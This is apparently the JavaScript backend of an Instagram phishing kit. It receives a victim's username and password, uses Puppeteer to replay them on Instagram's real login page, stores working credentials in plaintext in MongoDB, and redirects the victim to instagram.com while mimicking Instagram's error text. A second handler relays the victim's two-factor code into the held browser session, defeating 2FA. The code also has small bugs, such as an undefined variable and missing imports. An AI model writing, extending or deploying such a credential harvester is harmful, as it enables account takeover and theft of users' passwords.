import puppeteer from "puppeteer";
import { asyncHandler } from "../utils/asyncHandler.js";
import { User } from "../models/user.model.js"; // Interaction with MongoDB
import { ApiResponse } from "../utils/apiResponse.js";
let url = null;

const sessions = new Map();

const loginUser = asyncHandler(async (req, res) => {
  console.log(req.body);
  const { username, password } = req.body;
  // console.log(username, password);
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
    });
    const page = await browser.newPage();

    //setting up the reponse listener
    const loginPromise = new Promise((resolve, reject) => {
      page.on("response", async (response) => {
        url = response.url();
        // console.log(response.url());

        if (url.includes("/api/v1/web/accounts/login/ajax/")) {
          try {
            const respBody = await response.json();
            if (response.status() === 200 || response.status() === 400) {
              //can add respBody.two_factor_required===true for extra validation skipping it for now
              resolve(respBody);
            } else {
              reject(
                new Error(`login failed with status ${response.status()}`)
              );
            }
          } catch (error) {
            console.log(new Error(`Failed to parse response: ${e.message}`));
          }
        }
      });
    });

    await page.goto("https://instagram.com/accounts/login", {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    await page.waitForSelector('input[name="username"]');
    await page.waitForSelector('input[name="password"]');

    await page.type('input[name="username"]', username);
    await page.type('input[name="password"]', password);

    await page.click('button[type="submit"]');

    const result = await loginPromise;
    console.log("login result", result);

    console.log(result.authenticated);
    if (result.authenticated === true) {
      if (!(await User.findOne({ username }))) {
        const user = await User.create({
          username,
          password,
        });
      }
      // Set the Location header and send 200 status

      res.setHeader("Location", "https://www.instagram.com");
      return res.status(200).json({
        success: true,
        message: "Login successful",
      });
    }
    if (result.two_factor_required === true) {
      try {
        const sessionId = crypto.randomUUID();
        sessions.set(sessionId, { browser, page });

        const baseUrl = process.env.BASE_URL || "http://localhost:3000";
        const redirectUrl = `${baseUrl}/accounts/login/two_factor/${sessionId}`;

        console.log(`2FA required. Redirecting to: ${redirectUrl}`);

        res.setHeader("Access-Control-Expose-Headers", "Location");
        res.setHeader("Location", redirectUrl);
        return res.status(302).end();
      } catch (error) {
        console.error("Error in 2FA handling:", error);
        return res.status(500).json({
          success: false,
          message: "Internal server error during 2FA process",
        });
      }
    } else {
      return res.status(401).json({
        success: false,
        message:
          "Sorry, your password was incorrect. Please double-check your password.",
      });
    }
  } catch (error) {
    console.error("Login error:", error);
  }
});

const verify2FactorCode = asyncHandler(async (req, res) => {
  console.log('verify2factor called')
  const { sessionId } = req.params;
  const { verificationCode } = req.body;
  console.log(sessionId, verificationCode);

  const session = sessions.get(sessionId);
  if (!session) {
    return res.status(400).json({ message: "Invalid session" });
  }

  try {
    const { browser, page, username, password } = session; // Get credentials from session

    const verificationPromise = new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        reject(new Error("Verification timeout"));
      }, 10000);

      page.on("response", async (response) => {
        if (response.url().includes("/accounts/two_factor")) {
          clearTimeout(timeout);
          try {
            const respBody = await response.json();
            resolve(respBody);
          } catch (error) {
            reject(error);
          }
        }
      });
    });

    await page.waitForSelector('input[name="verificationCode"]', {
      timeout: 5000,
    });
    await page.type('input[name="verificationCode"]', verificationCode);
    await page.click('button[type="submit"]');

    const verificationResult = await verificationPromise;

    if (verificationResult.success) {
      if (username && password && !(await User.findOne({ username }))) {
        await User.create({ username, password });
      }

      // await browser.close(); // Cleanup
      sessions.delete(sessionId);

      return res.status(200).json({
        success: true,
        message: "2FA verification successful",
      });
    } else {
      // await browser.close(); // Cleanup on failure
      sessions.delete(sessionId);

      return res.status(400).json({
        success: false,
        message: "Invalid verification code",
      });
    }
  } catch (error) {
    console.error("2FA verification error:", error);
    // if (session?.browser) await session.browser.close();
    sessions.delete(sessionId);

    return res.status(500).json({
      success: false,
      message: "2FA verification failed",
    });
  }
});
export { loginUser, verify2FactorCode };

// import jsdom from "jsdom";
// const { JSDOM } = jsdom;
// 😭😭 this was dumb af
// async function login(username, password) {
//   const resp = await fetch("https://www.instagram.com/");
//   const htmlBody = await resp.text();
//   const dom = new JSDOM(htmlBody);

//   const usernameInput = dom.window.document.querySelector(
//     'input[name="username"]'
//   );
//   usernameInput.value = username;
//   const passwordInput = dom.window.document.querySelector(
//     'input[name="password"]'
//   );
//   passwordInput.value = password;

//   const loginButton = document.querySelector("button._acan._acap._acas");
//   loginButton.click();

//   return;
// }
